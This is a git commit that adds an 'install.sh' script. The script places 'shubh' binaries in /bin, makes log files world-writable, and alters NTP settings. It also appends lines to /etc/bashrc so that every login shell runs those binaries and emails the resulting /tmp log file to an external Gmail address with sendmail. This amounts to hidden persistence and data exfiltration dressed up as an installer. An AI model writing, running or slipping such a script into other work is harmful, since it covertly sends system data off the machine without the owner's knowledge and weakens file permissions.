261e69b96c1c9fbbe726343f245fe3ee1218a192
Shubham Kotwal <shubhamkotwal1225@gmail.com>
2019-08-24 20:20:26 +0530

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+chmod a+rwx logs*
+chmod a+rx
+mv shubh* /bin/
+mv logs* /tmp
+echo "shubh3 > /tmp/logs.log" >> /etc/bashrc
+echo "shubh3 >> /tmp/logs1.log" >> /etc/bashrc
+echo "sendmail shubhamk.esds@gmail.com < /tmp/logs.log" >> /etc/bashrc
+echo "shubh" >> /etc/bashrc
+systemctl enable ntpd
+systemctl restart ntpd
+ntpdate -q 0.centos.pool.ntp.org
+systemctl restart ntpd
+
